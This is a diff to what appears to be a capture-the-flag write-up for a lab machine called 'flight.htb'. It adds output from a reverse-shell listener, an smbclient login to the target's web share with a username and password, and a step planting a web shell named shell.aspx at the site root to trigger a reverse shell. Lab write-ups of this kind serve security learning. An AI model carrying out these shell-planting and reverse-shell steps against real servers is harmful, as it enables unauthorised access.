@@ -510,8 +510,11 @@ Saved as: shell.aspx
 This generate me a rev shell 
 
 ```python
-
+penelope -p 1337                                      
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.150 • 172.18.0.1 • 172.17.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
+This set me a listener
 
 ```python
 smbclient //g0.flight.htb/Web -U 'c.bum'%'Tikkycoll_431012284'
@@ -539,7 +542,11 @@ smb: \flight.htb\>
 ```
 This planted the shell at the root of `http://flight.htb/`
 
-Now if i access `http://flight.htb/shell.aspx`
+Now if i access `http://flight.htb/shell.aspx` it should trigger a shell
+
+```python
+
+```
 
 ```python
 
